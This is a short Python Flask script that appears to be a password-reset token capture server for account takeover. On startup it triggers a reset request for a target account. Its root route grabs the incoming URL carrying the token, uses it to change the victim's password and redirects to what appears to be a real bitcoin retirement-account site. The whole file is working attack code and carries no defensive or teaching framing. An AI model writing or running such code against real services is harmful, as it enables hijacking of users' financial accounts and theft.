from flask import Flask, redirect
from flask import request
from reset import Reset
import asyncio

app = Flask(__name__)
reset = Reset()

@app.route("/")
def capture_token():
    url = request.full_path
    asyncio.run(reset.change_password(url))
    return redirect("https://bitcoinira.com/404", 302)

with app.app_context():
    asyncio.run(reset.send_password_request(reset.target))

if __name__ == '__main__':
    app.run()
